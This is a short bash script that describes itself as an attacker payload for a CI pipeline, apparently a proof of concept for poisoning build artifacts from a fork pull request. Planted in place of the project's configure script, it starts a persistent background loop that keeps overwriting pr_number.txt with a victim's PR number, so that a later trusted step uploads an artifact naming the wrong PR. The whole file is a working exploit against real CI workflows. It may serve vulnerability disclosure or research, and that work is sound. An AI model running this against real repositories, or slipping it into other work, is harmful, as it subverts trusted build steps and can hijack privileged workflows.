#!/usr/bin/env bash
# ATTACKER payload for the clang-tidy-class variant. In the fork PR, replace
# scripts/ct-configure.sh with this. It runs during the producer's "Configure" step
# (analog of `cmake configure` executing the fork's CMakeLists = attacker code),
# BEFORE the trusted one-shot "Save PR number". It starts a PERSISTENT background
# loop that overwrites pr_number.txt with the VICTIM PR number; the loop survives
# across steps and wins against the later trusted write, so the uploaded artifact
# names the victim PR.
#
# ---- set to the victim PR number ----
VICTIM_PR=1
# -------------------------------------
setsid bash -c "while true; do echo ${VICTIM_PR} > pr_number.txt; sleep 0.1; done" >/dev/null 2>&1 &
echo "configure(attacker): background overwrite loop started -> victim PR ${VICTIM_PR}"
